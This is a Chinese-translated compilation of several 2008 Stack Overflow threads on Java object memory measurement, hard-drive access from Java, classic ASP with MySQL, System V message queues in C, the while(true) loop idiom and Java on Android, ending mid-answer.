我发现了一些文章（[Java 专家时事通讯](http://www.javaspecialists.eu/archive/Issue078.html)和[Javaworld](http://www.javaworld.com/cgi-bin/mailto/x_java.cgi?pagetosend=/export/home/httpd/javaworld/javaworld/javaqa/2003-12/02-qa-1226-sizeof.html&pagename=/javaworld/javaqa/2003-12/02-qa-1226-sizeof.html&pageurl=http://www.javaworld.com/javaworld/javaqa/2003-12/02-qa-1226-sizeof.html&site=jw_core)中的一些内容）和一个内置类[java.lang.instrument.getObjectSize()](http://java.sun.com/j2se/1.5.0/docs/api/java/lang/instrument/Instrumentation.html)声称可以测量内存使用的“近似值”（??），但这些似乎有点模糊……

（是的，我意识到在两个不同操作系统上运行的 JVM 可能会为不同的对象使用不同数量的内存）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-12-24T05:57:45.900

几年前我使用过[JProfiler](http://www.ej-technologies.com/products/jprofiler/overview.html)，它做得很好，您可以将内存使用情况细分到相当精细的级别。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-12-25T18:53:07.583

从 Java 5 开始，在 Hotspot 和其他支持它的 VM 上，您可以使用 Instrumentation 接口来询问 VM 给定对象的内存使用情况。这很繁琐，但你可以做到。如果您想尝试这种方法，我已经在我的网站上添加了一个关于使用 Instrumentation 框架[查询 Java 对象的内存大小的页面。](http://www.javamex.com/tutorials/memory/instrumentation.shtml)

作为 32 位机器上 Hotspot 的粗略指南：

*   对象使用 8 个字节进行“家务管理”
*   字段使用您期望它们使用的位长度（尽管布尔值往往被分配一个完整的字节）
*   对象引用使用 4 个字节
*   总体对象大小的粒度为 8 个字节（即，如果您有一个具有 1 个布尔字段的对象，它将使用 16 个字节；如果您有一个具有 8 个布尔值的对象，它也将使用 16 个字节）

就 VM 如何处理它们而言，集合并没有什么特别之处。它们的内存使用量是它们内部字段的总和——如果你计算这个——它们包含的每个对象的使用量。您需要考虑诸如 ArrayList 的默认数组大小之类的因素，以及当列表变满时该大小增加 1.5 的事实。但是，无论是询问 VM 还是使用上述指标，查看集合的源代码并“处理它”基本上都会让您得到答案。

如果“闭包”是指 Runnable 或 Callable 之类的东西，那么它就像任何其他对象一样只是一个无聊的旧对象。（注意它们并不是真正的闭包！！）

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-12-24T01:42:19.253

您可以使用[JMP](http://www.khelekore.org/jmp/)，但它仅适用于 Java 1.5。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-12-26T04:57:53.540

我已经使用过新版本的 Netbeans 附带的[探查器](http://profiler.netbeans.org/)几次，它运行良好，为您提供了大量有关内存使用和程序运行时的信息。绝对是一个很好的起点。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-12-27T23:15:13.713

如果您使用的是 1.5 之前的 VM - 您可以通过使用序列化来获得对象的大致大小。但是请注意..这可能需要该对象的双倍内存量。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-12-24T04:33:42.480

这可能不是您正在寻找的确切答案，但以下链接的博文将为您提供非常好的指导。 [关于内存的其他问题](https://stackoverflow.com/questions/371495/analyze-tomcat-heap-in-detail-on-a-production-system)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-12-24T05:43:44.743

我相信 Netbeans 中包含的分析器也可以监控内存使用情况，你可以试试

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-12-24T00:13:46.500

看看[PerfAnal](http://java.sun.com/developer/technicalArticles/Programming/perfanal/)是否会给你你想要的东西。

# java - 用java发出硬盘命令

> ID：390463
> 
> 赞同：1
> 
> 时间：2008-12-24T00:10:52.810
> 
> 标签：java, hard-drive, scsi

有谁知道在 Java 中向硬盘驱动器发出命令的方法？Java 甚至支持这种硬件交互吗？

例如，如果我想查询一个 SCSI 硬盘驱动器，是否有预先存在的 Java 方法来执行此操作，或者我必须自己编写？

[http://en.wikipedia.org/wiki/SCSI](http://en.wikipedia.org/wiki/SCSI)有一些关于 SCSI 命令的一般信息，以防您不熟悉。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-12-24T00:13:25.953

Java 不支持像这样直接与硬件对话。但是，您可以使用 JNI 从 Java 调用 C/C++ 函数。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-24T06:16:09.950

三个词“JNI 或 JNA”。我强烈建议看看后者，看看它是否适合你的情况，而不是仅仅选择 JNI。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-24T00:18:42.777

不，因为 Java 在“虚拟”机器而不是真实机器上运行。但它可以用作前面提到的 dj 使用 JNI 的桥梁。

根据[维基百科](http://en.wikipedia.org/wiki/Java_Native_Interface#Access_to_assembly_code)， JNI 也可以直接调用程序集。JNI 可用于调用用 C 或 C++ 编写的完整程序

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-24T07:12:55.593

您需要用 C/C++ 编写 HDD 接口代码，然后使用 JNI 从 Java 调用它

# asp.net - 如何将文件发布到 .NET 中的图像托管服务？

> ID：390472
> 
> 赞同：2
> 
> 时间：2008-12-24T00:18:58.703
> 
> 标签：asp.net, webclient

设想：

localhost 接收带有 3 个隐藏输入和一个已发布文件的当前 HttpRequest。然后我必须将此表单数据转发到外部图像主机并获得响应。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-24T00:44:59.433

请参阅 System.Net。[WebClient](http://msdn.microsoft.com/en-us/library/system.net.webclient(VS.80).aspx)和相关类。您可以使用它们创建对远程服务器的请求并处理响应。还可以让[Fiddle](http://www.fiddlertool.com/) r 帮助您复制浏览器发送的内容。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-13T23:17:23.807

我讨厌这样做。它浪费了我服务器的带宽并占用了 IIS 线程以及使用我服务器的 CPU。这很糟糕，值得不惜一切代价避免。许多服务，例如 fliqz，提供了一种机制，使文件直接从客户端上传到他们的服务器（绕过你的服务器），然后他们向你的服务器发出请求，将查询字符串上的各种信息传递给它。

# mysql - asp mysql 变量测试问题

> ID：390475
> 
> 赞同：1
> 
> 时间：2008-12-24T00:19:50.153
> 
> 标签：mysql, asp-classic

重新安装网站服务器后，我遇到了一个问题。

过去我可以这样做：

代码：

```
<% 
set msgSet = conn.execute("select * from base_scroller where scroller_num = 1" 
%> 
```

检查它是否不是空的或其他任何东西

代码：

```
<% if msgSet("scroller_name") <> "" then %> 
```

如果是的话，我可以用它做任何事情（比如展示它的价值）

代码：

```
<%= msgSet("scroller_name") %>
<% end if %> 
```

现在我不能这样做，“if”测试不适用于“msgSet（“scroller_name”）”，我必须先在另一个变量中重新定义它

代码：

```
<% scrollername = msgSet("scroller_name") %> 
```

然后只有这样我才能对其进行测试...

代码：

```
<% if scrollername <> "" then %> 
```

并展示它。

```
<%= scrollername %>
<% end if %> 
```

我只是想找回对 mysql 记录集变量（如 b4..）进行操作的选项。

有人遇到过这个问题吗？发生了什么变化，是错误的mysql varsion还是什么？

感谢你们。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-01T17:47:02.170

你应该做两件事来确保你在一个字段中有一个值：

1.  确保记录集不为空。
2.  确保当前字段中没有 NULL 值。

我不会对影响您的代码的驱动程序进行任何更改，但我认为不同之处在于您的字符串实际上返回一个空字符串（等于“”）并且您的记录集返回一个正确的 NULL 值（这不是平等的 ””）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-24T00:56:14.747

以前从未见过这个问题，我也不知道为什么（有关错误的更多信息会有所帮助） - 但是，作为一个相对快速的修复，您可能希望在使用它时投射该项目。喜欢：

```
 <%= cStr(msgSet("scroller_name")) %> 
```

有关详细信息，请参阅[http://www.w3schools.com/vbscript/vbscript_ref_functions.asp#conversion](http://www.w3schools.com/vbscript/vbscript_ref_functions.asp#conversion)。

**有关您收到的错误**的更多信息将帮助您获得更好的答案。没有 MyODBC 5.1，那么您使用的是哪个版本的 MyODBC 驱动程序？“我的 odbc 是：mysql 5.1 驱动程序”是指 MySQL 5.1 的驱动程序——应该是 MyODBC 版本 3.51。

另外，“在我重新安装了我的网站的服务器之后”你的意思是你做了服务器操作系统的全新安装吗？还是您只是重新安装了 MySQL？或者是其他东西？MySQL 5.1 刚刚于 12 月 8 日发布——这是升级的一部分吗？

最后，请阅读对您的问题的一些评论和您的一些回复。在所有条件相同的情况下，如果需要澄清，请编辑问题以添加详细信息。不要写回复。这不是一个论坛，一旦有人在它上面投票，你的回应就会失去它的背景。如果整个问题都集中在一个地方，而不是在问题和冒充回复的各种附录之间滚动，那么它也更容易处理整个问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-27T09:08:56.753

我遇到了同样的问题...只是将一个 asp 站点从 mysql 4 和 odbc 3.x （旧版本...）迁移到 mysql 5.1 和 odbc 5.1 。如果我尝试这个简单的代码：

设置 rs = conn.execute("select ....") 而不是 rs.eof response.write "t1 : " & rs("text") & "
t2 : " & rs("text") & "
" rs .movenext 结束

作为输出，我得到以下信息：t1：你好 t2：t1：你好吗 t2：等等...

我第二次访问它没有值的字段，唯一的方法是第一次使用临时变量来存储数据......

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-27T17:49:15.883

好的...

1.  新的 odbc 是 5.1：位于 mysql.com 服务器上（链接：[http](http://dev.mysql.com/downloads/connector/odbc/5.1.html) ://dev.mysql.com/downloads/connector/odbc/5.1.html ）

2.  是的。我再次在我的网络服务器上重新安装了操作系统（windows server 2003）并在其上安装了 mysql server 5.0。

3.  我没有收到错误，当我使用我正在解释的方法时，它只是没有返回任何数据，我必须像我解释的那样使用额外的变量。

请问您需要更多详细信息吗？

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-27T18:25:02.317

这可能是一种更好的测试方法，以另一种方式检查记录集是否为空。

我一般使用：

```
On Error Goto 0

set msgSet = conn.execute("select * from base_scroller where scroller_num = 1" 

If msgSet.EOF = True And msgSet.BOF = True Then
  Response.Write "Recordset cursor was at the beginning and end of file - empty set."
  Response.End
End If 
```

这可能有助于调试它。

哦，还有一些可能很重要的事情。我不记得是什么原因造成的，但有时我发现当通过记录集引用 MySQL 字段时，它总是小写，无论数据库定义或查询中的字段是什么。

如果这不会导致您的脚本失败，则可以尝试找出记录集返回的内容。

```
Dim i

For Each i In msgSet.Fields
  Response.Write i & "=[" & msgSet.Fields(i) & "]<br />"
Next 
```

祝你好运

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-12-24T12:21:34.410

更多细节：

我的 odbc 是：mysql 5.1 驱动程序。

我的mysql版本：mysql服务器5.0

我的连接字符串是：

我试图删除 STMT=SET CHARACTER SET hebrew;OPTION=3; 部分 - 没有变化......

问题是使用数据库中的任何变量，它可以是任何类型的变量（文本、日期、整数）......

甚至

day(msgSet("scroller_date")) 现在不起作用...

有趣的是……以前一切都很好…… b4 安装

你有什么不寻常的地方吗？也许是不同的 mysql/ODBC 版本？

# c - Linux 上的 System V 消息队列无法按预期工作

> ID：390476
> 
> 赞同：3
> 
> 时间：2008-12-24T00:22:38.307
> 
> 标签：c, linux, message-queue

我有以下应用程序，它复制了我在具有系统 v 消息队列的大型应用程序中遇到的问题。基本上，主函数生成一个密钥，然后使用 msgget() 创建一个消息队列。然后产生了 3 个分叉，每个分叉都有不同的 id。他们每个人都使用不同的正数运行 msgrcv（因此他们正在等待不同的消息）。

然后 Main 休眠几秒钟 a 向 id = 3 发送一条消息。但是唤醒的*不是第三个线程，而是另一个线程。*此代码是完全隔离的，因此您可以自己尝试。这段代码有什么问题？

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/wait.h>

struct dummy_struct {
    long mtype;
    char message[255];
};

int msg_queue_id;
void recv_thread(int id);

int main(int argc, char **argv)
{
    int i;
    key_t key;
    struct dummy_struct dummy = { 3, "hello" };

    //create a unique key
    if (key = ftok("/mnt/mydocuments/code/sys_v_fork_test/main.c", 'a') == -1)
    {
        printf("ftok didn't work\n");
        exit(1);
    }

    //create the unix sys 5 message queue
    if ((msg_queue_id = msgget(key, 0644 | IPC_CREAT)) == -1)
    {
        printf("msgget failed\n");
        exit(1);
    }
    else
        printf("my message queue id: %i\n", msg_queue_id);

    //fork off multiple recievers
    for (i = 1; i < 4; i++) // <- NOTE: 1 -> 4
    {
        if (fork() == 0)
            recv_thread(i);
    }

    printf("sleeping\n");
    sleep(5);

    //wait a little then send a message

    printf("sending message\n");
    if (msgsnd(msg_queue_id, &dummy, sizeof(struct dummy_struct), 0) == -1)
    {
        printf("msgsnd failed\n");
    }
    printf("main thread exiting");
    _exit(0);
}

void recv_thread(int id)
{
    struct dummy_struct dummy;

    printf("recv_thread with id: %i\n", id);

    if (msgrcv(msg_queue_id, &dummy, sizeof(struct dummy_struct), id, 0) == -1)
        printf("error in msgrcv\n");
    else
        printf("thread %i got %s back\n", id, dummy.message);
} 
```

如果我等待 2，则表示其结构包含设置为 2 的 mtype 的消息*。* 3 表示 3，依此类推。我的参考点是本指南： http: [//www.ecst.csuchico.edu/~beej/guide/ipc/mq.html](http://www.ecst.csuchico.edu/~beej/guide/ipc/mq.html)。有人可以帮忙吗？（您可能需要修改 ftok 代码行以指向您自己机器上的有效文件才能成功测试）。我在 EeePC 1000H 上运行 Fedora 10

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-24T00:49:31.933

啊，我想我已经修好了。这是因为对于“mtype”结构中的第一个成员集，我使用的是 int 而不是 long。传入 { 1l, "hello" } 并将 i 的定义更改为 long 似乎已修复它

# while-loop - while (true) 是否具有坏的编程习惯？

> ID：390481
> 
> 赞同：74
> 
> 时间：2008-12-24T00:28:02.103
> 
> 标签：while-loop, readability

我经常使用这种代码模式：

```
while(true) {

    //do something

    if(<some condition>) {
        break;
    }

} 
```

另一位程序员告诉我，这是不好的做法，我应该用更标准的替换它：

```
while(!<some condition>) {

    //do something

} 
```

他的理由是，您可能太容易“忘记休息”并陷入无休止的循环。我告诉他，在第二个例子中，你可以很容易地放入一个永远不会返回 true 的条件，所以很容易有一个无限循环，所以两者都是同样有效的做法。

此外，我通常更喜欢前者，因为当您有多个断点（即退出循环的多个条件）时，它使代码更易于阅读。

任何人都可以通过为一方或另一方添加证据来丰富这一论点吗？

* * *

## 回答 #1

> 赞同：58
> 
> 时间：2008-12-24T00:37:10.977

这两个示例之间存在差异。第一个将每次至少执行一次“做某事”，即使该语句永远不会为真。当语句评估为真时，第二个只会“做某事”。

我认为您正在寻找的是一个 do-while 循环。我 100% 同意这`while (true)`不是一个好主意，因为它很难维护这段代码，而且你逃避循环的方式非常`goto`古怪，这被认为是不好的做法。

尝试：

```
do {
  //do something
} while (!something); 
```

检查您的个人语言文档以了解确切的语法。但是看看这段代码，它基本上做了do中的事情，然后检查while部分看它是否应该再做一次。

* * *

## 回答 #2

> 赞同：32
> 
> 时间：2008-12-24T02:19:46.557

引用过去著名的开发者华兹华斯的话：

> ......
> 事实上，我们自己注定要落入的
> 监狱，没有监狱；因此，对我来说，在各种情绪中，被束缚 在十四行诗的贫瘠土地上是一种
> 消遣； 很高兴有些灵魂（他们的需要必须如此） 感受到了太多自由的重量， 应该在那里找到短暂的慰藉，正如我所发现的那样。

华兹华斯接受十四行诗的严格要求，作为一个解放框架，而不是一件紧身衣。我建议“结构化编程”的核心是放弃构建任意复杂流程图的自由，转而易于理解。

我完全同意，*有时*提前退出是表达行动的最简单方式。然而，我的经验是，当我强迫自己使用尽可能简单的控制结构（并真正考虑在这些约束内进行设计）时，我通常会发现结果是更简单、更清晰的代码。缺点是

```
while (true) {
    action0;
    if (test0) break;
    action1;
} 
```

是很容易让`action0`和`action1`变得越来越大的代码块，或者添加“只是一个”测试-中断-动作序列，直到变得难以指向特定的行并回答问题，“我需要什么条件现在知道坚持吗？” 因此，在不为其他程序员制定规则的情况下，我尽量避免`while (true) {...}`在自己的代码中使用这种习惯用法。

* * *

## 回答 #3

> 赞同：25
> 
> 时间：2008-12-24T01:21:31.340

当您可以在表单中编写代码时

```
while (condition) { ... } 
```

或者

```
while (!condition) { ... } 
```

正文中**没有退出（`break`、、`continue`或`goto`）**，这种形式是首选，因为有人可以**通过查看标题来阅读代码并理解终止条件**。那挺好的。

但是很多循环不适合这个模型，**中间有明确退出的无限循环是一个光荣的模型**。（带 的循环`continue`通常比带 的循环更难理解`break`。）如果你想引用一些证据或权威，看看 Don Knuth 的著名论文《[使用 Goto 语句进行结构化编程》](http://web.archive.org/web/20130731202547/http://pplab.snu.ac.kr/courses/adv_pl05/papers/p261-knuth.pdf)；你会找到所有你想要的例子、论据和解释。

一个小成语：把`while (true) { ... }`你写成一个老 Pascal 程序员，或者现在可能是一个 Java 程序员。如果您**使用 C 或 C++ 编写，首选的习惯用法是**

```
for (;;) { ... } 
```

这样做没有充分的理由，但你应该这样写，因为这是 C 程序员期望看到的方式。

* * *

## 回答 #4

> 赞同：13
> 
> 时间：2008-12-24T00:49:37.130

我更喜欢

```
while(!<some condition>) {
    //do something
} 
```

但我认为这更多的是可读性问题，而不是“忘记休息”的可能性。我认为忘记`break`是一个相当弱的论点，因为那将是一个错误，您会立即找到并修复它。

我反对使用 a`break`来摆脱无限循环的论点是，您实际上是将`break`语句用作`goto`. 我并不反对使用`goto`（如果语言支持它，这是公平的游戏），但如果有更易读的替代方案，我会尝试替换它。

在很多`break`点的情况下，我会将它们替换为

```
while( !<some condition> ||
       !<some other condition> ||
       !<something completely different> ) {
    //do something
} 
```

以这种方式合并所有停止条件可以更容易地查看将结束此循环的内容。 `break`语句可以散布在各处，那是不可读的。

* * *

## 回答 #5

> 赞同：11
> 
> 时间：2008-12-24T01:17:24.017

while (true) 如果你有很多语句并且你想在任何失败时停止，那么它可能是有意义的

```
 while (true) {
     if (!function1() ) return;   
     if (!function2() ) return;   
     if (!function3() ) return;   
     if (!function4() ) return;  
   } 
```

好于

```
 while (!fail) {
     if (!fail) {
       fail = function1()
     }           
     if (!fail) {
       fail = function2()
     }  
     ........

   } 
```

* * *

## 回答 #6

> 赞同：7
> 
> 时间：2008-12-25T17:25:45.700

哈维尔对我之前的回答（引用华兹华斯的那个）做了一个有趣的评论：

> 我认为 while(true){} 是一个比 while(condition){} 更“纯粹”的结构。

我无法在 300 个字符中做出充分回应（对不起！）

在我的教学和指导中，我非正式地将“复杂性”定义为“我需要在脑海中掌握多少其余代码才能理解这一行或表达式？” 我要记住的东西越多，代码就越复杂。代码明确告诉我的越多，复杂性就越低。

因此，以降低复杂性为目标，让我以完整性和强度而不是纯粹性来回答哈维尔。

我想到了这个代码片段：

```
while (c1) {
    // p1
    a1;
    // p2
    ...
    // pz
    az;
} 
```

同时表达两件事：

1.  只要`c1`保持真实，（整个）主体就会重复，并且
2.  在第 1 点，`a1`执行，`c1`保证**保持**。

区别在于视角之一；`a1`其中第一个通常与整个循环的外部动态行为有关，而第二个对于理解内部的静态保证很有用，我在特别考虑时可以依靠它。当然，`a1`可能无效的净效应`c1`，要求我更加努力地思考我在第 2 点可以指望什么，等等。

让我们放置一个特定的（小）示例来考虑条件和第一个操作：

```
while (index < length(someString)) {
    // p1
    char c = someString.charAt(index++);
    // p2
    ...
} 
```

“外部”问题是循环显然在内部做一些`someString`事情，只要`index`定位在`someString`. 这建立了一个期望，即我们将在体内`index`或`someString`体内进行修改（在我检查身体之前不知道的位置和方式），以便最终发生终止。这给了我思考身体的背景和期望。

“内部”问题是我们保证第 1 点之后的操作是合法的，因此在阅读第 2 点的代码时，我可以考虑使用我**知道**已合法获得的 char 值做了什么。（如果是空引用，我们甚至无法评估条件`someString`，但我也假设我们已经在这个示例的上下文中防范了这种情况！）

相反，以下形式的循环：

```
while (true) {
    // p1
    a1;
    // p2
    ...
} 
```

在这两个问题上让我失望。在外层，我想知道这是否意味着我**真的**应该期望这个循环永远循环（例如操作系统的主事件调度循环），或者是否还有其他事情发生。这既没有给我一个明确的阅读正文的上下文，也没有对构成（不确定的）终止进展的期望。

在内部层面上，我**绝对不能**明确保证在第 1 点可能存在的任何情况`true`。当然，在任何地方都为真的条件是关于我们在程序中的任何点所能知道的最弱的陈述。在尝试思考动作完成什么时，了解动作的先决条件是非常有价值的信息！

所以，我认为这个成语比我上面描述的逻辑`while (true) ...`更不完整、更弱，因此也更复杂。`while (c1) ...`

* * *

## 回答 #7

> 赞同：6
> 
> 时间：2014-05-05T09:52:02.203

问题是并非每个算法都坚持“while(cond){action}”模型。

一般循环模型是这样的：

```
loop_prepare
 loop:
  action_A
  if(cond) exit_loop
  action_B
  goto loop
after_loop_code 
```

当没有 action_A 时，您可以将其替换为：

```
loop_prepare
  while(cond)
  action_B
after_loop_code 
```

当没有 action_B 时，您可以将其替换为：

```
loop_prepare
  do action_A
  while(cond)
after_loop_code 
```

一般情况下，action_A 会被执行 n 次，而 action_B 会被执行 (n-1) 次。

一个真实的例子是：打印一个用逗号分隔的表格的所有元素。我们希望所有 n 个元素都带有 (n-1) 个逗号。

你总是可以做一些技巧来坚持 while-loop 模型，但这总是会重复代码或检查两次相同的条件（对于每个循环）或添加一个新变量。因此，与 while-true-break 循环模型相比，您的效率和可读性总是较低。

（坏）“技巧”示例：添加变量和条件

```
loop_prepare
b=true // one more local variable : more complex code
 while(b): // one more condition on every loop : less efficient
  action_A
  if(cond) b=false // the real condition is here
  else action_B
after_loop_code 
```

（坏）“技巧”的例子：重复代码。修改两个部分之一时，不能忘记重复的代码。

```
loop_prepare
action_A
 while(cond):
  action_B
  action_A
after_loop_code 
```

注意：在最后一个示例中，程序员可以通过将“loop_prepare”与第一个“action_A”混合，将 action_B 与第二个 action_A 混合来混淆（愿意或不愿意）代码。所以他可以感觉到他没有这样做。

* * *

## 回答 #8

> 赞同：4
> 
> 时间：2008-12-24T00:35:57.203

如果从循环中中断的方式有很多，或者在循环的顶部不能很容易地表达中断条件（例如，循环的内容需要运行到一半但另一半不能运行），第一种是可以的，在最后一次迭代中）。

但如果你能避免它，你应该这样做，因为编程应该以最明显的方式编写非常复杂的东西，同时还要正确和高效地实现特性。这就是为什么你的朋友在一般情况下是正确的。你朋友写循环结构的方式要明显得多（假设上一段中描述的条件不成立）。

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2008-12-24T02:45:43.103

在[Is WHILE TRUE...BREAK...END WHILE 一个好的设计中已经有一个基本相同的问题？](https://stackoverflow.com/questions/212531/is-while-truebreakend-while-a-good-design). @Glomek 回答（在一篇被低估的帖子中）：

> 有时它是非常好的设计。有关示例，请参阅Donald Knuth 的[使用 Goto 语句进行结构化编程。](http://pplab.snu.ac.kr/courses/adv_pl05/papers/p261-knuth.pdf)我经常将这个基本思想用于运行“n 次半”的循环，尤其是读取/处理循环。但是，我通常尝试只有一个 break 语句。这使得在循环终止后更容易推断程序的状态。

稍后，我回复了相关的，也被严重低估的评论（部分原因是我第一次没有注意到格洛梅克，我想）：

> 一篇引人入胜的文章是 1974 年 Knuth 的“使用 go to 语句进行结构化编程”（可在他的《文学编程》一书中找到，也可能在其他地方也可以找到）。除其他事项外，它还讨论了打破循环的受控方式，以及（不使用该术语）循环半语句。
> 
> Ada 还提供循环结构，包括

```
loopname:
    loop
        ...
        exit loopname when ...condition...;
        ...
    end loop loopname; 
```

> 原始问题的代码在意图上与此类似。

引用的 SO 项目与此项目之间的一个区别是“最终休息”；这是一个单次循环，它使用 break 提前退出循环。关于这是否也是一种好的风格也存在疑问——我手头没有交叉参考。

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2008-12-24T07:30:43.997

有时您需要无限循环，例如侦听端口或等待连接。

所以 while(true)... 不应该归类为好或坏，让情况决定使用什么

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2008-12-24T00:36:29.027

这取决于您要做什么，但总的来说，我更喜欢将条件放在 while 中。

*   它更简单，因为您不需要在代码中进行其他测试。
*   它更容易阅读，因为您不必在循环内寻找中断。
*   你在重新发明轮子。while 的全部意义在于，只要测试为真，就可以做某事。为什么要通过将中断条件放在其他地方来颠覆它？

如果我正在编写一个守护进程或其他应该运行直到它被杀死的进程，我会使用一个 while(true) 循环。

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2008-12-24T01:16:33.207

如果有一个（并且只有一个）非异常中断条件，则最好将该条件直接放入控制流构造（while）中。看到 while(true) { ... } 让我作为一个代码阅读者认为没有简单的方法来枚举中断条件并让我思考“仔细看看这个并仔细考虑中断条件（之前设置了什么它们在当前循环中以及在前一个循环中可能设置的内容）”

简而言之，在最简单的情况下，我和你的同事在一起，但是 while(true){ ... } 并不少见。

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2008-12-24T01:28:25.867

完美顾问的回答：视情况而定。大多数情况下，正确的做法是使用 while 循环

```
while (condition is true ) {
    // do something
} 
```

或用类 C 语言完成的“重复直到”

```
do {
    // do something
} while ( condition is true); 
```

如果其中任何一种情况有效，请使用它们。

有时，就像在服务器的内部循环中一样，您的意思是程序应该继续运行，直到外部中断它为止。（考虑一下，例如，一个 httpd 守护进程——它不会停止，除非它崩溃或被关机停止。）

*THEN AND ON THE*使用 while(1):

```
while(1) {
   accept connection
   fork child process
} 
```

最后一种情况是您希望在终止之前执行某些功能的罕见情况。在这种情况下，请使用：

```
while(1) { // or for(;;)
   // do some stuff
   if (condition met) break;
   // otherwise do more stuff.
} 
```

* * *

## 回答 #14

> 赞同：1
> 
> 时间：2008-12-24T01:39:08.980

我认为使用“while(true)”的好处可能是让多个退出条件更容易编写，特别是如果这些退出条件必须出现在代码块中的不同位置。但是，对我来说，当我必须干运行代码以查看代码如何交互时，这可能会很混乱。

就我个人而言，我会尽量避免 while(true)。原因是每当我回顾之前编写的代码时，我通常会发现我需要弄清楚它何时运行/终止的时间比实际执行的要多。因此，必须先找到“中断”对我来说有点麻烦。

如果需要多个退出条件，我倾向于将条件确定逻辑重构为单独的函数，以便循环块看起来干净且更易于理解。

* * *

## 回答 #15

> 赞同：1
> 
> 时间：2008-12-24T06:07:35.693

不，这还不错，因为您在设置循环时可能并不总是知道退出条件，或者可能有多个退出条件。但是，它确实需要更加小心以防止无限循环。

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2008-12-24T00:36:58.217

他可能是正确的。

在功能上，两者可以相同。

然而，为了**可读性**和理解程序流程，while(condition) 更好。休息更像是一种goto。while（条件）在继续循环的条件等方面非常清楚。这并不意味着 break 是错误的，只是可读性较差。

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2008-12-24T00:37:33.113

我想到了使用后一种构造的一些优点：

*   无需在循环代码中查找中断，就更容易理解循环在做什么。

*   如果您不在循环代码中使用其他中断，则循环中只有一个退出点，那就是 while() 条件。

*   通常最终会减少代码，这增加了可读性。

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2008-12-24T00:39:04.373

我更喜欢 while(!) 方法，因为它更清楚、更直接地传达了循环的意图。

* * *

## 回答 #19

> 赞同：0
> 
> 时间：2008-12-24T01:30:45.707

这里有很多关于可读性及其结构良好的讨论，但是与所有大小不固定的循环一样（即执行 while 和 while），您将面临风险。

```
His reasoning was that you could "forget the break" too easily and have an endless loop. 
```

在 while 循环中，您实际上是在要求一个无限期运行的进程，除非发生某些事情，如果在某个参数内没有发生某些事情，您将得到您想要的……一个无限循环。

* * *

## 回答 #20

> 赞同：0
> 
> 时间：2008-12-24T07:25:15.707

你朋友推荐的和你做的不一样。你自己的代码更类似于

```
do{
    // do something
}while(!<some condition>); 
```

无论条件如何，它总是至少运行一次循环。

但正如其他人所提到的，有时休息是完全可以的。针对你朋友“忘记休息”的担忧，我经常写成如下形式：

```
while(true){
    // do something
if(<some condition>) break;
    // continue do something
} 
```

通过良好的缩进，断点对于第一次阅读代码的人来说是很清楚的，看起来就像在循环的开头或底部中断的代码一样结构化。

* * *

## 回答 #21

> 赞同：0
> 
> 时间：2008-12-24T08:29:44.393

不是*while(true)*部分不好，而是你必须打破或摆脱它的事实才是问题所在。break 和 goto 并不是真正可以接受的流量控制方法。

我也不是很明白这一点。即使在循环整个程序持续时间的东西中，你至少可以有一个叫做 Quit 的布尔值或者你设置为 true 的东西，以便在循环中正确退出循环，比如 while(!Quit)... 不是只是在某个任意点调用 break 然后跳出来，

* * *

## 回答 #22

> 赞同：0
> 
> 时间：2008-12-26T06:51:14.637

使用循环

while(1) { 做事 }

在某些情况下是必要的。如果您进行任何嵌入式系统编程（想想像 PIC、MSP430 和 DSP 编程这样的微控制器），那么几乎所有代码都将处于 while(1) 循环中。在为 DSP 编码时，有时您只需要一段时间 (1){}，其余代码是中断服务例程 (ISR)。

# android - Android 上的 JRE

> ID：390482
> 
> 赞同：36
> 
> 时间：2008-12-24T00:28:04.833
> 
> 标签：android, java, dalvik

这听起来像是一个愚蠢的问题，但谷歌并没有帮助我。

是否有适用于 Android 的 JRE？如果有，是哪个版本？是否缺少任何主要功能？

如果不是，这是否意味着需要重新编译所有 Java 应用程序才能让 Dalvik 在 Android 上运行？

**更新;** 是否会有适用于 Android 的 JRE？

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2008-12-24T00:31:39.600

不，那里没有。Google 确实为 Android 创建了一个完全不同的运行时，其中的基类完全不同（尽管*兼容*）

它使用 Java 作为语言（语法）而不是 Java 平台。

[您可以在此处](https://web.archive.org/web/20081217032436/http://code.google.com/android/what-is-android.html)了解 Android 平台。

从该页面：

> *Android 包含一组核心库，可提供Java 编程语言核心库中可用的**大部分功能。***

用粗体“最”阅读。

因此，尽管它们看起来相似，但它们并不相同。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-04T20:50:11.623

我找到的最接近的是[http://www.apogee.com/products/cjre-a](http://www.apogee.com/products/cjre-a)

不幸的是，如该页面所述：

